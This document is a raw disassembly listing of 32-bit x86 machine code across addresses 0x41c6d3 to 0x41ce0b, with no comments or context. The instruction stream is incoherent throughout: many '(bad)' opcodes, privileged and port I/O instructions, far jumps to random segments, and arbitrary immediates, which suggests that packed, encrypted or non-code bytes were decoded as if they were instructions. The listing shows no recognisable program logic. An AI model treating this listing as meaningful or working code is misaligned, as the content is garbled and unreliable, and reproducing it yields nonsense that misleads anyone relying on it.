  41c6d3:	mov    ds:0xabf6db29,al
  41c6d8:	push   esp
  41c6d9:	imul   esi,edi,0xe1cda55d
  41c6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6e0:	mov    WORD PTR [esi+0x4dc0f103],ds
  41c6e6:	leave  
  41c6e7:	outs   dx,DWORD PTR ds:[esi]
  41c6e8:	inc    ebx
  41c6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6ea:	jae    0x41c722
  41c6ec:	arpl   WORD PTR [eax],bp
  41c6ee:	(bad)  
  41c6ef:	mov    ah,0x6e
  41c6f1:	imul   ecx,DWORD PTR [ebp+0x74],0xffffffee
  41c6f5:	sbb    esp,DWORD PTR [edx+0x33]
  41c6f8:	out    dx,eax
  41c6f9:	fst    QWORD PTR [ebp+0x164b13ee]
  41c6ff:	jecxz  0x41c691
  41c701:	xchg   ecx,eax
  41c702:	adc    DWORD PTR [eax-0x39],edi
  41c705:	add    BYTE PTR [ebp-0x2c],ch
  41c708:	xor    esi,ebx
  41c70a:	jne    0x41c710
  41c70c:	sub    al,ch
  41c70e:	inc    edi
  41c70f:	popa   
  41c710:	lds    ebx,FWORD PTR [ecx+0x7288c58d]
  41c716:	hlt    
  41c717:	add    DWORD PTR [ebx],esi
  41c719:	mov    eax,ds:0x8dffae52
  41c71e:	popa   
  41c71f:	mov    gs,WORD PTR [ecx+ebx*8-0x1377cea0]
  41c726:	pop    esi
  41c727:	dec    esi
  41c728:	cdq    
  41c729:	ds scas eax,DWORD PTR es:[edi]
  41c72b:	fist   DWORD PTR [ebp+0x3a]
  41c72e:	xchg   BYTE PTR [edx],dl
  41c730:	enter  0xc7a9,0xd6
  41c734:	pop    esi
  41c735:	mov    edx,gs
  41c737:	push   ebp
  41c738:	movzx  ebx,cl
  41c73b:	mov    bh,0x7f
  41c73d:	outs   dx,BYTE PTR ds:[esi]
  41c73e:	sub    BYTE PTR [ecx-0x75e8a571],0x68
  41c745:	pop    esi
  41c746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c747:	ja     0x41c78b
  41c749:	sti    
  41c74a:	add    ch,ch
  41c74c:	(bad)  
  41c74d:	mov    edi,0x464741d1
  41c752:	int    0x40
  41c754:	add    bh,BYTE PTR [edi+0x25]
  41c757:	loop   0x41c72e
  41c759:	lods   al,BYTE PTR ds:[esi]
  41c75a:	stos   DWORD PTR es:[edi],eax
  41c75b:	cmp    edi,edx
  41c75d:	shr    BYTE PTR [edi-0x7e],0xcf
  41c761:	inc    edx
  41c762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c763:	mov    ebx,0xd2aed176
  41c768:	rcr    DWORD PTR [esi-0x3ecde51],0xb8
  41c76f:	and    DWORD PTR [edi+0x4d],0x3d0927a9
  41c776:	sub    esi,DWORD PTR [esi]
  41c778:	jbe    0x41c71e
  41c77a:	and    dh,BYTE PTR [edi+edi*8-0x7b]
  41c77e:	push   0xffffffe0
  41c780:	ror    DWORD PTR [eax+0x74],1
  41c783:	mov    ds:0x46b1c3a5,eax
  41c788:	cdq    
  41c789:	xchg   edi,eax
  41c78a:	mov    cl,0xee
  41c78c:	add    ebx,0xf066a30e
  41c792:	sub    al,0xf0
  41c794:	leave  
  41c795:	push   cs
  41c796:	stos   BYTE PTR es:[edi],al
  41c797:	lods   al,BYTE PTR ds:[si]
  41c799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c79a:	arpl   WORD PTR ds:0x26d85e3,cx
  41c7a0:	add    BYTE PTR [ecx],0x99
  41c7a3:	or     DWORD PTR [ebx+0x7ebb603c],edi
  41c7a9:	sub    edi,DWORD PTR [ebx]
  41c7ab:	push   cs
  41c7ac:	mov    ebx,DWORD PTR [edx+0x11326bc5]
  41c7b2:	adc    al,BYTE PTR [esp+eiz*2]
  41c7b5:	cmp    al,0xf0
  41c7b7:	adc    BYTE PTR [eax+0x3a17bf56],ch
  41c7bd:	arpl   WORD PTR [ebx-0x4c],bx
  41c7c0:	sahf   
  41c7c1:	mov    bl,0x84
  41c7c3:	cwde   
  41c7c4:	inc    eax
  41c7c5:	and    edi,DWORD PTR [ebp+0x6]
  41c7c8:	stos   BYTE PTR es:[edi],al
  41c7c9:	retf   
  41c7ca:	add    ecx,0xffffff90
  41c7cd:	loope  0x41c7da
  41c7cf:	add    DWORD PTR [esi],edx
  41c7d1:	fs out dx,al
  41c7d3:	addr16 or edi,edi
  41c7d6:	cmp    eax,0x935ebfd6
  41c7db:	outs   dx,BYTE PTR ds:[esi]
  41c7dc:	(bad)  
  41c7dd:	shr    BYTE PTR [edx+0x799433c6],cl
  41c7e3:	iret   
  41c7e4:	aas    
  41c7e5:	sub    ch,bh
  41c7e7:	imul   ecx,ecx,0x6b
  41c7ea:	mov    dh,0x9c
  41c7ec:	mov    eax,0xd31139f9
  41c7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7f2:	rcl    bh,cl
  41c7f4:	fidiv  WORD PTR [edx+edx*2-0x319fc56e]
  41c7fb:	pop    eax
  41c7fc:	jmp    0x41c79a
  41c7fe:	(bad)  
  41c800:	or     eax,0x921eb71d
  41c805:	out    0x8e,al
  41c807:	mov    al,ds:0x31906293
  41c80c:	cdq    
  41c80d:	aaa    
  41c80e:	xor    al,bh
  41c810:	xor    BYTE PTR [esi+0x69],al
  41c813:	xchg   ebx,eax
  41c814:	out    0xa0,al
  41c816:	ja     0x41c7c7
  41c818:	pop    edi
  41c819:	je     0x41c813
  41c81b:	inc    ecx
  41c81c:	stc    
  41c81d:	aam    0x56
  41c81f:	mov    cl,BYTE PTR ds:0x8b547f3a
  41c825:	push   0x1c36aad8
  41c82a:	dec    edx
  41c82b:	add    ecx,DWORD PTR [ecx+0x48e800dd]
  41c831:	xchg   ebp,eax
  41c832:	dec    ebx
  41c833:	or     ebx,ebp
  41c835:	sub    dh,dh
  41c837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c838:	pop    ebx
  41c839:	jmp    0x41c7d0
  41c83b:	cmp    al,0x49
  41c83d:	fcomip st,st(2)
  41c83f:	outs   dx,DWORD PTR ds:[esi]
  41c840:	sti    
  41c841:	je     0x41c816
  41c843:	jmp    0x1e9eb542
  41c848:	fisttp WORD PTR [edx+0x1c]
  41c84b:	mov    ebp,0xf133ed44
  41c850:	je     0x41c887
  41c852:	cs push ebx
  41c854:	lods   al,BYTE PTR ds:[esi]
  41c855:	xchg   edi,eax
  41c856:	sub    ah,dh
  41c858:	mov    edi,0x791069db
  41c85d:	pop    edi
  41c85e:	(bad)  
  41c85f:	sti    
  41c860:	jmp    0x41c87b
  41c862:	lahf   
  41c863:	arpl   WORD PTR [eax-0x72a2775c],dx
  41c869:	cmp    cl,0xd5
  41c86c:	dec    esp
  41c86d:	jg     0x41c857
  41c86f:	inc    esp
  41c870:	mov    al,0x26
  41c872:	xor    eax,0x7ff7551c
  41c877:	xchg   ecx,eax
  41c879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c87a:	pop    di
  41c87c:	pop    esi
  41c87d:	dec    ebx
  41c87e:	call   0xb32fb729
  41c883:	pop    ecx
  41c884:	call   DWORD PTR [esi+0x3ef3ebf3]
  41c88a:	test   BYTE PTR [ecx],dh
  41c88c:	jle    0x41c88b
  41c88e:	jmp    0x251a:0x30e07559
  41c895:	inc    ebp
  41c896:	mov    ah,0xb9
  41c898:	inc    esi
  41c899:	bnd jae 0x41c8d0
  41c89c:	xchg   ebx,eax
  41c89d:	(bad)  
  41c89e:	fcomp  QWORD PTR [ebx]
  41c8a0:	push   0xfffffffb
  41c8a2:	in     al,0xee
  41c8a4:	mov    esp,DWORD PTR [ebp-0x4cb609f]
  41c8aa:	xlat   BYTE PTR ds:[ebx]
  41c8ab:	std    
  41c8ac:	lods   al,BYTE PTR ds:[esi]
  41c8ad:	push   ss
  41c8ae:	popf   
  41c8af:	cmc    
  41c8b0:	arpl   WORD PTR [edi-0x3af5a3c1],di
  41c8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8b7:	adc    ah,BYTE PTR [edi]
  41c8b9:	arpl   WORD PTR [ebx+0x24c4215a],ax
  41c8bf:	sbb    al,0x36
  41c8c1:	jg     0x41c92d
  41c8c3:	(bad)  
  41c8c4:	icebp  
  41c8c5:	scas   eax,DWORD PTR es:[edi]
  41c8c6:	jnp    0x41c8ba
  41c8c8:	jmp    0x5946:0xf5d67ab3
  41c8cf:	mov    bl,0xa7
  41c8d2:	test   DWORD PTR ds:0x5332bf6c,ebx
  41c8d8:	xchg   BYTE PTR [esi-0x7d],ah
  41c8db:	and    cl,dl
  41c8dd:	lds    edi,FWORD PTR [ecx+edi*8]
  41c8e0:	mov    cl,0xab
  41c8e2:	add    al,0x1a
  41c8e4:	mov    eax,ds:0xda037ff4
  41c8e9:	jmp    0xfa9d:0x2e5a3713
  41c8f0:	pop    ds
  41c8f1:	jg     0x41c947
  41c8f3:	mul    ecx
  41c8f5:	call   0x67995e24
  41c8fa:	sar    BYTE PTR [ebx+0x52],cl
  41c8fd:	adc    dl,BYTE PTR [esi+ebp*1-0x2da27d55]
  41c904:	je     0x41c8ba
  41c906:	jp     0x41c95a
  41c908:	add    al,0x7
  41c90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c90b:	inc    BYTE PTR [edi-0x149a1037]
  41c911:	jge    0x41c8cc
  41c913:	jnp    0x41c921
  41c915:	push   cs
  41c916:	scas   al,BYTE PTR es:[edi]
  41c917:	loopne 0x41c8c6
  41c919:	loopne 0x41c8ff
  41c91b:	aam    0xb8
  41c91d:	adc    al,0xa3
  41c91f:	jno    0x41c8d8
  41c921:	ss and al,0x67
  41c924:	popa   
  41c925:	aad    0xfc
  41c927:	xor    al,0xd7
  41c929:	or     edx,ebp
  41c92b:	dec    eax
  41c92c:	cmp    eax,0x348618b9
  41c931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c932:	daa    
  41c933:	cmc    
  41c934:	popa   
  41c935:	or     DWORD PTR [edx-0x64],esp
  41c938:	(bad)
  41c93b:	call   0xce735197
  41c940:	jb     0x41c9b1
  41c942:	je     0x41c907
  41c944:	sti    
  41c945:	adc    edx,DWORD PTR [ecx+0x1d8387ba]
  41c94b:	xor    al,0x3d
  41c94d:	cdq    
  41c94e:	inc    edi
  41c94f:	add    dl,BYTE PTR [eax+0x414eb812]
  41c955:	fnstsw WORD PTR [esi]
  41c957:	ret    
  41c958:	pop    ecx
  41c959:	aam    0xdb
  41c95b:	scas   al,BYTE PTR es:[edi]
  41c95c:	mov    eax,ds:0x8af1bb03
  41c961:	xchg   esp,eax
  41c962:	sahf   
  41c963:	jp     0x41c983
  41c965:	fsubr  st(2),st
  41c967:	xchg   edx,eax
  41c968:	sub    ch,BYTE PTR [esi]
  41c96a:	or     eax,0x89fd0b1d
  41c96f:	jo     0x41c9b3
  41c971:	or     DWORD PTR [ebp+0x1c70c1cf],ebx
  41c977:	sbb    ch,ah
  41c979:	or     dh,BYTE PTR [edx-0x4d7ee95b]
  41c97f:	push   ds
  41c980:	ds inc edx
  41c982:	push   ss
  41c983:	or     eax,0xd0ddf8b8
  41c988:	jg     0x41c928
  41c98a:	sbb    DWORD PTR [esi-0x27f172ad],0x42
  41c991:	sahf   
  41c992:	cmp    esi,DWORD PTR [edi-0x68]
  41c995:	fisttp DWORD PTR [ebx*1-0x61fef2bf]
  41c99c:	mov    ds:0x3b05c6d2,al
  41c9a1:	repz xlat BYTE PTR ds:[ebx]
  41c9a3:	sbb    eax,0x68b2fba0
  41c9a8:	mov    ah,BYTE PTR [esi]
  41c9aa:	adc    eax,0x7d68958a
  41c9af:	adc    dl,BYTE PTR [eax+0x39]
  41c9b2:	retf   
  41c9b3:	push   es
  41c9b4:	xchg   edi,eax
  41c9b5:	test   al,0x83
  41c9b7:	jb     0x41c9ea
  41c9b9:	(bad)  
  41c9ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9bb:	int    0x7a
  41c9bd:	push   0x2a
  41c9bf:	and    eax,0x1d7a6dad
  41c9c4:	or     ebx,esp
  41c9c6:	xor    esi,edx
  41c9c8:	mov    bh,0x30
  41c9ca:	and    DWORD PTR [ebx+0x55fd2e06],0x57105353
  41c9d4:	test   eax,0xfb12aa63
  41c9d9:	sub    ebx,DWORD PTR [edx+0x68]
  41c9dc:	mov    edi,0x33413638
  41c9e1:	push   es
  41c9e2:	xchg   DWORD PTR [edi-0x1eca3714],edx
  41c9e8:	sti    
  41c9e9:	cs pop edi
  41c9eb:	cs push ebx
  41c9ed:	mov    ch,0xb
  41c9ef:	into   
  41c9f0:	fldcw  WORD PTR [eax]
  41c9f2:	mov    cl,0xde
  41c9f4:	inc    ebx
  41c9f5:	adc    al,0x2d
  41c9f7:	cmp    eax,0x5f4918fe
  41c9fc:	(bad)  [edx+0x18]
  41c9ff:	push   esi
  41ca00:	hlt    
  41ca01:	sahf   
  41ca02:	sti    
  41ca03:	push   0xfffffffe
  41ca05:	(bad)
  41ca08:	add    ah,al
  41ca0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca0b:	in     al,dx
  41ca0c:	(bad)  [esi+0x6]
  41ca0f:	test   bh,dh
  41ca11:	bound  eax,QWORD PTR [eax-0x1c]
  41ca14:	out    0xe9,al
  41ca16:	stc    
  41ca17:	add    BYTE PTR [edi-0x1971e30c],0x3e
  41ca1e:	sahf   
  41ca1f:	add    esi,DWORD PTR [edx]
  41ca21:	cmp    eax,DWORD PTR [ebx-0x70321e1d]
  41ca27:	inc    edx
  41ca28:	out    0xd4,eax
  41ca2a:	retf   0xc6cb
  41ca2d:	icebp  
  41ca2e:	pop    ebx
  41ca2f:	icebp  
  41ca30:	and    edx,DWORD PTR [edx]
  41ca32:	cmp    ebx,DWORD PTR [edx]
  41ca34:	jnp    0x41c9d0
  41ca36:	mov    al,0xb1
  41ca38:	xchg   edx,eax
  41ca39:	(bad)
  41ca3c:	xor    al,0x56
  41ca3e:	lahf   
  41ca3f:	shl    BYTE PTR [edi+0x4d20da0f],1
  41ca45:	addr16 inc ebp
  41ca47:	adc    al,0x88
  41ca49:	out    dx,al
  41ca4a:	pop    edi
  41ca4b:	fiadd  DWORD PTR [edi+0x21]
  41ca4e:	data16 add bh,BYTE PTR [eax]
  41ca51:	in     al,dx
  41ca52:	push   cs
  41ca53:	inc    esp
  41ca54:	or     eax,0xa707de28
  41ca59:	add    esi,DWORD PTR cs:[ecx]
  41ca5c:	les    eax,FWORD PTR [ebx+edx*8+0x26]
  41ca60:	push   edx
  41ca61:	pop    ebx
  41ca62:	xor    BYTE PTR [esi-0x96e69fc],bh
  41ca68:	ret    
  41ca69:	push   edx
  41ca6a:	jl     0x41ca7c
  41ca6c:	mov    eax,0x93f2fa33
  41ca71:	pop    edi
  41ca72:	cmp    ebx,DWORD PTR [ebx+0x3f32e28]
  41ca78:	ret    
  41ca79:	mov    al,ds:0x932461f8
  41ca7e:	mov    eax,ds:0xe65656fe
  41ca83:	xchg   edi,eax
  41ca84:	sub    DWORD PTR [edi-0x5bc18e58],0xffffffef
  41ca8b:	je     0x41cab3
  41ca8d:	adc    dh,dh
  41ca8f:	mov    dl,0x54
  41ca91:	mov    ds:0xa7d82471,al
  41ca96:	retf   
  41ca97:	shl    BYTE PTR [esi+0x1ac51853],0xc6
  41ca9e:	jno    0x41caa5
  41caa0:	sub    al,0xa6
  41caa2:	jb     0x41ca85
  41caa4:	mov    edx,0xb9f80f4
  41caa9:	test   DWORD PTR [esi+0x11],eax
  41caac:	lock enter 0xfe86,0xd4
  41cab1:	ins    BYTE PTR es:[edi],dx
  41cab2:	sbb    al,0x6
  41cab4:	mov    al,ds:0xb06b154c
  41cab9:	aam    0x82
  41cabb:	jo     0x41cae4
  41cabd:	inc    eax
  41cabe:	or     DWORD PTR [esi+ebx*8],esi
  41cac1:	and    ebp,esp
  41cac3:	sti    
  41cac4:	mov    ebx,0x11e3f4c9
  41cac9:	and    eax,0x94188e5d
  41cace:	sahf   
  41cacf:	xchg   edx,eax
  41cad0:	cmp    al,0x67
  41cad2:	cwde   
  41cad3:	push   0x56
  41cad5:	mov    esi,0x496cbf6d
  41cada:	mov    eax,DWORD PTR [edx+0x58]
  41cadd:	aaa    
  41cade:	cmp    dl,al
  41cae0:	mov    ds:0xf306a14e,al
  41cae5:	or     edx,DWORD PTR [edi]
  41cae7:	jns    0x41cac1
  41cae9:	inc    esp
  41caea:	mov    ds:0xafd555bd,eax
  41caef:	cld    
  41caf0:	dec    esp
  41caf1:	fwait
  41caf2:	cmp    BYTE PTR [edx+eiz*1-0x5e],cl
  41caf6:	push   ebx
  41caf7:	(bad)  
  41caf8:	mov    al,0xd
  41cafa:	pop    esi
  41cafb:	jae    0x41caa6
  41cafd:	lahf   
  41cafe:	ss jae 0x41cac3
  41cb01:	mov    ds:0xc258fb7e,eax
  41cb06:	and    edi,DWORD PTR [ecx+ecx*1+0xd537c16]
  41cb0d:	xchg   ecx,eax
  41cb0e:	xchg   edi,eax
  41cb0f:	xchg   edi,eax
  41cb10:	lods   al,BYTE PTR ds:[esi]
  41cb11:	pop    ebp
  41cb12:	daa    
  41cb13:	push   0x4dc3b14e
  41cb18:	or     ebx,esi
  41cb1a:	bt     DWORD PTR [ecx-0x4e],ebp
  41cb1e:	ins    DWORD PTR es:[edi],dx
  41cb1f:	or     eax,0xd9477e66
  41cb24:	out    dx,eax
  41cb25:	xchg   ebx,eax
  41cb26:	imul   esp,ecx,0xb646f27a
  41cb2c:	cmp    al,0x78
  41cb2e:	jbe    0x41cac1
  41cb30:	xchg   ebp,eax
  41cb31:	mov    bl,0x94
  41cb33:	cmp    DWORD PTR [esi+0x7fa65b4c],ebp
  41cb39:	(bad)  
  41cb3a:	test   BYTE PTR [ebx+0x561268e7],0x90
  41cb41:	sub    ch,0x35
  41cb44:	ds push ds
  41cb46:	sub    eax,0xf3bd4745
  41cb4b:	mov    cl,0xd
  41cb4d:	(bad)  
  41cb4e:	adc    bl,BYTE PTR [eax+eax*8+0x35]
  41cb52:	add    BYTE PTR [ebx],0x2e
  41cb55:	jp     0x41cbd2
  41cb57:	lods   al,BYTE PTR ds:[esi]
  41cb58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb59:	sbb    DWORD PTR [edx-0x77],edi
  41cb5c:	xor    BYTE PTR es:[ebx+0x4e],al
  41cb60:	sub    eax,0xe9ddbfe
  41cb65:	dec    ebp
  41cb66:	loopne 0x41cb47
  41cb68:	dec    esi
  41cb69:	and    eax,0x940b3b1e
  41cb6e:	pop    ebx
  41cb6f:	retf   0x49e2
  41cb72:	fdivp  st(1),st
  41cb74:	lods   eax,DWORD PTR ds:[esi]
  41cb75:	jg     0x41cb18
  41cb77:	add    eax,0xfb09aaee
  41cb7c:	jo     0x41cb10
  41cb7e:	mov    esi,0x3725577f
  41cb83:	aad    0x57
  41cb85:	popf   
  41cb86:	xchg   ebp,eax
  41cb87:	add    al,0xbd
  41cb89:	pushf  
  41cb8a:	sbb    ebx,DWORD PTR [ebx+0x42]
  41cb8d:	test   BYTE PTR [ebx-0x80],dh
  41cb90:	pop    es
  41cb91:	mov    edx,0xd1fe32d6
  41cb96:	loope  0x41cbf1
  41cb98:	xchg   esi,eax
  41cb99:	lds    eax,FWORD PTR [eax]
  41cb9b:	xchg   BYTE PTR [ecx-0x14],dl
  41cb9e:	fistp  WORD PTR [eax-0x46164f37]
  41cba4:	leave  
  41cba5:	imul   ebx,DWORD PTR [esi+ebx*8-0x20],0xd
  41cbaa:	into   
  41cbab:	cmp    esi,DWORD PTR [ecx-0x57850004]
  41cbb1:	jmp    0x6c71eaf5
  41cbb6:	ins    DWORD PTR es:[edi],dx
  41cbb7:	adc    dh,dh
  41cbb9:	jmp    0x41cbe1
  41cbbb:	mov    esp,0x6cc05a1e
  41cbc0:	push   esi
  41cbc1:	inc    esp
  41cbc2:	jb     0x41cba7
  41cbc4:	(bad)  
  41cbc5:	xlat   BYTE PTR ds:[ebx]
  41cbc6:	sub    BYTE PTR [edi+0x757af58a],dl
  41cbcc:	adc    al,0x39
  41cbce:	xchg   ebp,eax
  41cbcf:	das    
  41cbd0:	bound  ebx,QWORD PTR [edx+edi*8+0x23]
  41cbd4:	jae    0x41cbbe
  41cbd6:	cld    
  41cbd7:	mov    esi,cs
  41cbd9:	xor    cl,BYTE PTR [ecx+0x10]
  41cbdc:	mov    ecx,0x57ff9a56
  41cbe1:	stos   BYTE PTR es:[edi],al
  41cbe2:	pcmpeqb mm2,QWORD PTR ds:0x8ef20dac
  41cbe9:	cmp    eax,0x628ef8ed
  41cbee:	ja     0x41cb74
  41cbf0:	jmp    FWORD PTR [ecx-0x51]
  41cbf3:	imul   ecx,DWORD PTR [ecx+0x65],0x42f4aa0d
  41cbfa:	adc    eax,0xf2b345be
  41cbff:	(bad)  
  41cc01:	gs jmp 0xdfeb:0x61992dd9
  41cc09:	(bad)  
  41cc0a:	pushf  
  41cc0b:	mov    ecx,eax
  41cc0d:	jl     0x41cbd9
  41cc0f:	daa    
  41cc10:	sti    
  41cc11:	jecxz  0x41cbd6
  41cc13:	jmp    0xc187:0x88074179
  41cc1a:	mov    al,0xec
  41cc1c:	add    eax,0x763b61ed
  41cc21:	cmp    DWORD PTR [eax-0x35e8967e],0x19
  41cc28:	xlat   BYTE PTR ds:[ebx]
  41cc29:	inc    esp
  41cc2a:	xor    BYTE PTR [eax+0x4a20e5f8],cl
  41cc30:	xchg   edx,eax
  41cc31:	cmp    BYTE PTR [edi],0xe7
  41cc34:	mov    ds:0x669953fe,eax
  41cc39:	test   DWORD PTR [esi],ebp
  41cc3b:	and    esp,DWORD PTR [ebx]
  41cc3d:	and    DWORD PTR [ecx],edi
  41cc3f:	mov    ebx,ecx
  41cc41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc42:	cmc    
  41cc43:	loope  0x41cc65
  41cc45:	fisttp QWORD PTR [edi+0x4d79ab5e]
  41cc4b:	fisub  DWORD PTR [ecx+0x14a145b1]
  41cc51:	xlat   BYTE PTR ds:[ebx]
  41cc52:	js     0x41cbdf
  41cc54:	(bad)  
  41cc55:	mov    ds:0x1b13c941,eax
  41cc5a:	fsubr  QWORD PTR [ecx-0x54bab554]
  41cc60:	or     DWORD PTR [eax+0x8],ecx
  41cc63:	imul   esp,edi,0x142c9ab6
  41cc69:	push   ss
  41cc6a:	imul   ebp,DWORD PTR ss:[edx-0x6e79d1f6],0x7141483a
  41cc75:	cmp    DWORD PTR [esi+0x36020531],ebp
  41cc7b:	xor    BYTE PTR [edx+0x19],ah
  41cc7e:	mov    cl,0xc3
  41cc80:	mov    dl,0xfb
  41cc82:	jge    0x41cc47
  41cc84:	ret    
  41cc85:	int3   
  41cc86:	push   esi
  41cc87:	rcl    DWORD PTR [edx+0x204888b9],cl
  41cc8d:	popf   
  41cc8e:	add    al,0xe7
  41cc90:	push   esi
  41cc91:	dec    ecx
  41cc92:	or     al,0xd0
  41cc94:	lods   eax,DWORD PTR ds:[esi]
  41cc95:	je     0x41cc4f
  41cc97:	pop    ss
  41cc98:	sub    BYTE PTR [edi+esi*8],ch
  41cc9b:	pop    ecx
  41cc9c:	xchg   ebp,eax
  41cc9d:	cld    
  41cc9e:	test   DWORD PTR fs:[ecx-0x4c],edx
  41cca2:	cmp    ecx,DWORD PTR [ecx]
  41cca4:	or     ecx,esi
  41cca6:	push   edx
  41cca7:	fst    DWORD PTR cs:[edi+ebx*2-0x55fe5cce]
  41ccaf:	pop    es
  41ccb0:	neg    DWORD PTR [esi-0x3c425cc6]
  41ccb6:	(bad)  
  41ccb8:	dec    eax
  41ccb9:	and    edx,DWORD PTR [ebx-0xf]
  41ccbc:	inc    esp
  41ccbd:	fs fs mov dh,0xb
  41ccc1:	lods   eax,DWORD PTR ds:[esi]
  41ccc2:	sub    BYTE PTR [ebp+0x2a06c7eb],cl
  41ccc8:	mov    cl,0x11
  41ccca:	loopne 0x41cc88
  41cccc:	cli    
  41cccd:	jp     0x41cd0a
  41cccf:	loope  0x41cd1a
  41ccd1:	sub    eax,edx
  41ccd3:	into   
  41ccd4:	sbb    edx,DWORD PTR [edx+0x671497a8]
  41ccda:	fucomi st,st(4)
  41ccdc:	gs push ebx
  41ccde:	push   cs
  41ccdf:	outs   dx,BYTE PTR ds:[esi]
  41cce0:	test   BYTE PTR ss:[ebx-0x31],dl
  41cce4:	push   esp
  41cce5:	fisttp DWORD PTR [eax]
  41cce7:	jg     0x41cce3
  41cce9:	jmp    0xf701:0x4c5af702
  41ccf0:	outs   dx,DWORD PTR ds:[esi]
  41ccf1:	call   0x7ac52d06
  41ccf6:	dec    ebp
  41ccf7:	and    ah,bl
  41ccf9:	aad    0x5b
  41ccfb:	sbb    edi,DWORD PTR [edx]
  41ccfd:	dec    ebx
  41ccfe:	and    al,0xd7
  41cd00:	dec    ebp
  41cd01:	gs mov bh,0x7c
  41cd04:	clc    
  41cd05:	xor    DWORD PTR [edx+0x7fc40624],0xa0c736fd
  41cd0f:	or     DWORD PTR [edx+ebx*8-0x79],esi
  41cd13:	jnp    0x41ccb9
  41cd15:	cdq    
  41cd16:	bnd ret 
  41cd18:	pusha  
  41cd19:	rep stos DWORD PTR es:[edi],eax
  41cd1b:	pushf  
  41cd1c:	sbb    al,0xd8
  41cd1e:	(bad)  
  41cd1f:	(bad)  
  41cd20:	xor    al,ah
  41cd22:	ins    BYTE PTR es:[edi],dx
  41cd23:	in     eax,dx
  41cd24:	repz pop ebp
  41cd26:	imul   edx,DWORD PTR [ebx-0x32],0x31
  41cd2a:	adc    DWORD PTR [ebx],esi
  41cd2c:	cmp    edi,DWORD PTR [edx+ebx*4-0x1ef68a35]
  41cd33:	xor    edx,0x37
  41cd36:	sub    dl,al
  41cd38:	adc    edx,ecx
  41cd3a:	or     BYTE PTR [edi+0x60],cl
  41cd3d:	dec    edx
  41cd3e:	xchg   ebx,eax
  41cd3f:	cmp    dh,BYTE PTR [edx-0x62845ec7]
  41cd45:	scas   eax,DWORD PTR es:[edi]
  41cd46:	add    eax,0x32a5cd14
  41cd4b:	(bad)  
  41cd4d:	fisttp WORD PTR [eax+ebp*1+0x4af0ec5d]
  41cd54:	in     eax,dx
  41cd55:	imul   eax,DWORD PTR [ecx-0x13],0xffffff93
  41cd59:	in     al,dx
  41cd5a:	cmc    
  41cd5b:	mov    ?,WORD PTR [edi-0x57ae87dc]
  41cd61:	inc    ebx
  41cd62:	in     eax,0x21
  41cd64:	sahf   
  41cd65:	repnz outs dx,DWORD PTR ds:[esi]
  41cd67:	in     al,dx
  41cd68:	jo     0x41cd86
  41cd6a:	out    dx,eax
  41cd6b:	mov    dl,0x22
  41cd6d:	rcr    edx,1
  41cd6f:	lea    esp,[edi]
  41cd71:	adc    DWORD PTR [edi-0x5579adda],0x4cf0fa7
  41cd7b:	(bad)  
  41cd7c:	rcl    DWORD PTR [edi+esi*4+0x2f],cl
  41cd80:	stos   DWORD PTR es:[edi],eax
  41cd81:	repz or al,0x2d
  41cd84:	sub    BYTE PTR [ebx+0x56],dh
  41cd87:	xchg   esp,eax
  41cd88:	sub    esi,edx
  41cd8a:	mov    bh,0xc
  41cd8c:	jmp    0xa601:0x3c640693
  41cd93:	pushf  
  41cd94:	cmp    BYTE PTR ds:0x8a868ed6,0x6b
  41cd9b:	xchg   BYTE PTR [ebx+0x5c],cl
  41cd9e:	jg     0x41ce16
  41cda0:	in     eax,dx
  41cda1:	or     BYTE PTR [ebx+0x7c],al
  41cda4:	mov    dh,0xa5
  41cda6:	xor    dh,BYTE PTR [edi+ebp*8]
  41cda9:	xor    eax,0xfe73b3a4
  41cdae:	rol    edi,cl
  41cdb0:	fnsetpm(287 only) 
  41cdb2:	mov    al,ds:0x48f17fae
  41cdb7:	lock add DWORD PTR [edi],esi
  41cdba:	aas    
  41cdbb:	pusha  
  41cdbc:	inc    ebx
  41cdbd:	hlt    
  41cdbe:	imul   edi,DWORD PTR [edi-0x3503ee0a],0xffffffe0
  41cdc5:	std    
  41cdc6:	dec    ecx
  41cdc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdc9:	cdq    
  41cdca:	xchg   edx,eax
  41cdcb:	out    dx,al
  41cdcc:	jmp    0x399948d5
  41cdd1:	push   ss
  41cdd2:	mov    esp,0x5d1cd95b
  41cdd7:	sbb    al,0xbf
  41cdd9:	cdq    
  41cdda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cddb:	or     al,0xe
  41cddd:	outs   dx,BYTE PTR ds:[esi]
  41cdde:	jo     0x41cd89
  41cde0:	mov    eax,0x48fd8a99
  41cde5:	adc    dl,BYTE PTR [ecx-0x34]
  41cde8:	xor    eax,0x31e5ce0b
  41cded:	js     0x41ce48
  41cdef:	inc    edx
  41cdf0:	cwde   
  41cdf1:	ja     0x41cda3
  41cdf3:	scas   al,BYTE PTR es:[edi]
  41cdf4:	push   ecx
  41cdf5:	pop    es
  41cdf6:	inc    edx
  41cdf7:	mov    cl,0x32
  41cdf9:	xchg   esi,eax
  41cdfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdfb:	fidivr WORD PTR [ebp+eax*8+0x5b]
  41cdff:	pop    es
  41ce00:	or     BYTE PTR [edx],ch
  41ce02:	rol    BYTE PTR [esi+0x4e],0x94
  41ce06:	or     BYTE PTR [eax-0x37],cl
  41ce09:	es sahf 
  41ce0b:	add    DWORD PTR [ecx-0x6e9fbd3],ebx
